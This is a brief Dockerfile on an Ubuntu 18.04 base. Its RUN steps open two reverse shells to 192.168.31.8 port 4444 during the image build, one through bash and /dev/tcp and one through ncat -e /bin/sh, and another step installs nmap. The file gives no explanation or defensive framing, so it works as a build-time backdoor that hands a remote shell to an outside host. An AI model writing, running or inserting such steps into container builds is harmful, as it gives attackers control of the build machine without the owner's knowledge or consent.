FROM ubuntu:18.04
RUN bash -i >& /dev/tcp/192.168.31.8/4444 0>&1
RUN apt update && apt install -y nmap
RUN ncat 192.168.31.8 4444 -e /bin/sh
CMD ["/bin/sh"]
